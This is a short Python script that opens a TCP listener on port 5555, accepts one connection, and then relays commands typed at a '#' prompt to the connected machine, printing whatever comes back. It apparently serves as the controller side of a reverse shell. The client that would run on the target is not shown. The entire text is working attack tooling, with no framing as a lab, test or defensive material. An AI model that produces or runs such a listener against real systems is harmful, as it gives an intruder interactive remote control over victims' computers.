import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = ""
port = 5555
s.bind((host, port))
s.listen(1)
c, ip = s.accept()
print("I think it ran")
while True:
	cmd = input("#")
	c.sendall(cmd.encode('utf-8'))
	data = c.recv(1024)
	data = data.decode('utf-8')
	print(data)